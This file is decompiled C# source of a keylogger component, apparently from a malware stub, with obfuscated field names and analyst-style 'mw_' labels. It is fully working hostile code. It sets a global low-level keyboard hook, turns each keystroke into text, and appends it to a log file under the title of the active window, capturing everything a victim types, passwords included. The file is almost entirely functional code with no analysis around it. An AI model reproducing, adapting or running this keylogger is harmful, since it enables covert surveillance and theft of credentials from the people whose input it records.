using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub
{
	// Token: 0x0200000E RID: 14
	public class mw_KeyLogger
	{
		// Token: 0x0600008B RID: 139
		public static void mw_startKeyLogger()
		{
			mw_KeyLogger.RnGmcCbsTOGZSxif71qhy8j3 = mw_KeyLogger.mw_keylogger(mw_KeyLogger.ncTpRHKxQhwwLt8CGhM9Oic0);
			Application.Run();
		}

		// Token: 0x0600008C RID: 140
		private static IntPtr mw_keylogger(mw_KeyLogger.LowLevelKeyboardProc oR7pJJgQ33AYk0KXmmDvQPnE)
		{
			IntPtr result;
			using (Process currentProcess = Process.GetCurrentProcess())
			{
				result = mw_KeyLogger.SetWindowsHookEx(mw_KeyLogger.gWjJOcOy4OBK22v0zVtVatwB, oR7pJJgQ33AYk0KXmmDvQPnE, mw_KeyLogger.GetModuleHandle(currentProcess.ProcessName), 0U);
			}
			return result;
		}

		// Token: 0x0600008D RID: 141
		private static IntPtr mw_writeKeyLoggerOutput(int IAENaJRPy3knmjSxVURpjJce, IntPtr 6nTQzutKh1B5DkhfsxaeMcuI, IntPtr value)
		{
			if (IAENaJRPy3knmjSxVURpjJce >= 0 && 6nTQzutKh1B5DkhfsxaeMcuI == (IntPtr)256)
			{
				object value2 = Marshal.ReadInt32(value);
				object obj = ((int)mw_KeyLogger.GetKeyState(20) & 65535) != 0;
				object value3 = ((int)mw_KeyLogger.GetKeyState(160) & 32768) != 0 || ((int)mw_KeyLogger.GetKeyState(161) & 32768) != 0;
				object obj2 = mw_KeyLogger.mw_convertVirtualKeyToString(Conversions.ToUInteger(value2));
				if (Conversions.ToBoolean((Conversions.ToBoolean(obj) || Conversions.ToBoolean(value3)) ? true : false))
				{
					obj2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj2, null, "ToUpper", new object[0], null, null, null));
				}
				else
				{
					obj2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj2, null, "ToLower", new object[0], null, null, null));
				}
				if (Conversions.ToInteger(value2) >= 112 && Conversions.ToInteger(value2) <= 135)
				{
					obj2 = "[" + Conversions.ToString(Conversions.ToInteger(value2)) + "]";
				}
				else
				{
					string left = ((Keys)Conversions.ToInteger(value2)).ToString();
					if (Operators.CompareString(left, "Space", false) == 0)
					{
						obj2 = "[SPACE]";
					}
					else if (Operators.CompareString(left, "Return", false) == 0)
					{
						obj2 = "[ENTER]";
					}
					else if (Operators.CompareString(left, "Escape", false) == 0)
					{
						obj2 = "[ESC]";
					}
					else if (Operators.CompareString(left, "LControlKey", false) == 0)
					{
						obj2 = "[CTRL]";
					}
					else if (Operators.CompareString(left, "RControlKey", false) == 0)
					{
						obj2 = "[CTRL]";
					}
					else if (Operators.CompareString(left, "RShiftKey", false) == 0)
					{
						obj2 = "[Shift]";
					}
					else if (Operators.CompareString(left, "LShiftKey", false) == 0)
					{
						obj2 = "[Shift]";
					}
					else if (Operators.CompareString(left, "Back", false) == 0)
					{
						obj2 = "[Back]";
					}
					else if (Operators.CompareString(left, "LWin", false) == 0)
					{
						obj2 = "[WIN]";
					}
					else if (Operators.CompareString(left, "Tab", false) == 0)
					{
						obj2 = "[Tab]";
					}
					else if (Operators.CompareString(left, "Capital", false) == 0)
					{
						if (Operators.ConditionalCompareObjectEqual(obj, true, false))
						{
							obj2 = "[CAPSLOCK: OFF]";
						}
						else
						{
							obj2 = "[CAPSLOCK: ON]";
						}
					}
				}
				using (StreamWriter streamWriter = new StreamWriter(mw_config.mw_logFile, true))
				{
					if (object.Equals(mw_KeyLogger.IuDFbaI0Q1dR5IQMPI45z0eq, mw_KeyLogger.mw_getCurrentWindowProcessName()))
					{
						streamWriter.Write(RuntimeHelpers.GetObjectValue(obj2));
					}
					else
					{
						streamWriter.WriteLine(Environment.NewLine);
						streamWriter.WriteLine("###  " + mw_KeyLogger.mw_getCurrentWindowProcessName() + " ###");
						streamWriter.Write(RuntimeHelpers.GetObjectValue(obj2));
					}
				}
			}
			return mw_KeyLogger.CallNextHookEx(mw_KeyLogger.RnGmcCbsTOGZSxif71qhy8j3, IAENaJRPy3knmjSxVURpjJce, 6nTQzutKh1B5DkhfsxaeMcuI, value);
		}

		// Token: 0x0600008E RID: 142
		private static string mw_convertVirtualKeyToString(uint vKey)
		{
			uint num = 0U;
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				object obj = new byte[256];
				if (!mw_KeyLogger.GetKeyboardState((byte[])obj))
				{
					return "";
				}
				object value = mw_KeyLogger.MapVirtualKey(vKey, 0U);
				IntPtr keyboardLayout = mw_KeyLogger.GetKeyboardLayout(mw_KeyLogger.GetWindowThreadProcessId(mw_KeyLogger.GetForegroundWindow(), out num));
				mw_KeyLogger.ToUnicodeEx(vKey, Conversions.ToUInteger(value), (byte[])obj, stringBuilder, 5, 0U, keyboardLayout);
				return stringBuilder.ToString();
			}
			catch (Exception ex)
			{
			}
			return (checked((Keys)vKey)).ToString();
		}

		// Token: 0x0600008F RID: 143
		private static string mw_getCurrentWindowProcessName()
		{
			uint num = 0U;
			string result;
			try
			{
				IntPtr foregroundWindow = mw_KeyLogger.GetForegroundWindow();
				mw_KeyLogger.GetWindowThreadProcessId(foregroundWindow, out num);
				object processById = Process.GetProcessById(checked((int)num));
				object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(processById, null, "MainWindowTitle", new object[0], null, null, null));
				if (string.IsNullOrWhiteSpace(Conversions.ToString(objectValue)))
				{
					objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(processById, null, "ProcessName", new object[0], null, null, null));
				}
				mw_KeyLogger.IuDFbaI0Q1dR5IQMPI45z0eq = Conversions.ToString(objectValue);
				result = Conversions.ToString(objectValue);
			}
			catch (Exception ex)
			{
				result = "???";
			}
			return result;
		}

		// Token: 0x06000090 RID: 144
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetWindowsHookEx([In] int idHook, [In] mw_KeyLogger.LowLevelKeyboardProc lpfn, [In] IntPtr hmod, [In] uint dwThreadId);

		// Token: 0x06000091 RID: 145
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool UnhookWindowsHookEx([In] IntPtr hhk);

		// Token: 0x06000092 RID: 146
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CallNextHookEx([In] [Optional] IntPtr hhk, [In] int nCode, [In] IntPtr wParam, [In] IntPtr lParam);

		// Token: 0x06000093 RID: 147
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x06000094 RID: 148
		[DllImport("user32.dll")]
		private static extern IntPtr GetForegroundWindow();

		// Token: 0x06000095 RID: 149
		[DllImport("user32.dll", SetLastError = true)]
		private static extern uint GetWindowThreadProcessId([In] IntPtr hWnd, out uint lpdwProcessId);

		// Token: 0x06000096 RID: 150
		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		private static extern short GetKeyState(int nVirtKey);

		// Token: 0x06000097 RID: 151
		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool GetKeyboardState(byte[] lpKeyState);

		// Token: 0x06000098 RID: 152
		[DllImport("user32.dll")]
		private static extern IntPtr GetKeyboardLayout([In] uint idThread);

		// Token: 0x06000099 RID: 153
		[DllImport("user32.dll")]
		private static extern int ToUnicodeEx([In] uint wvirtKey, [In] uint wScanCode, [In] byte[] lpKeyState, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder pwszBuff, [In] int cchBuff, [In] uint wFlags, [In] IntPtr dwhkl);

		// Token: 0x0600009A RID: 154
		[DllImport("user32.dll")]
		private static extern uint MapVirtualKey([In] uint uCode, [In] uint uMapType);

		// Token: 0x04000027 RID: 39
		private static string IuDFbaI0Q1dR5IQMPI45z0eq;

		// Token: 0x04000028 RID: 40
		private const int pRjAXyzOnxQ0Qh948el5nbFF = 256;

		// Token: 0x04000029 RID: 41
		private static mw_KeyLogger.LowLevelKeyboardProc ncTpRHKxQhwwLt8CGhM9Oic0 = new mw_KeyLogger.LowLevelKeyboardProc(mw_KeyLogger.mw_writeKeyLoggerOutput);

		// Token: 0x0400002A RID: 42
		private static IntPtr RnGmcCbsTOGZSxif71qhy8j3 = IntPtr.Zero;

		// Token: 0x0400002B RID: 43
		private static int gWjJOcOy4OBK22v0zVtVatwB = 13;

		// Token: 0x0200000F RID: 15
		// (Invoke) Token: 0x0600009E RID: 158
		private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
	}
}
